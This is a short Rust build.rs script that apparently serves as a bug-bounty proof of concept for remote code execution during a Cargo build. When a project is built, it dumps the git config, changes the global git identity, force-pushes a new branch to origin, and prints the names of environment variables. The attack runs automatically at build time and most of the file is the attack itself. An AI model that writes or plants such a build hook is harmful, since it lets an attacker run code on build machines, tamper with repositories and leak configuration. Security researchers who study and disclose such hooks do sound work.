use std::process::Command;

fn main() {
    println!("cargo:warning=*** BUILD.RS EXECUTED - RCE MARKER ***");
    println!("cargo:rustc-env=FORCE_RUN=1");

    eprintln!("cargo:warning=*** ____RCE_Success ***");

    // Show git config
    let _ = Command::new("sh")
        .arg("-c")
        .arg("git config --list >&2 || echo 'no git config' >&2")
        .status();

    eprintln!("cargo:warning=*** ____RCE_Success ***");

    // Test write permissions
    let _output = Command::new("sh")
        .arg("-c")
        .arg("git config --global user.email \"bh@someemail.com\"; \
              git config --global user.name \"H1Tester\"; \
              git fetch origin 2>&1; \
              git checkout master/v2 2>&1; \
              git pull origin master/v2 2>&1; \
              git checkout -b bh-poc 2>&1; \
              git add . 2>&1; \
              git push  --force  -u origin bh-poc 2>&1")
        .output()
        .expect("failed to execute shell");

    // Show environment variable *names*
    let _ = Command::new("sh")
        .arg("-c")
        .arg("printenv | cut -d= -f1 >&2")
        .status();

    eprintln!("cargo:warning=*** ---test permissions (SAFE PoC)--- ***");
}
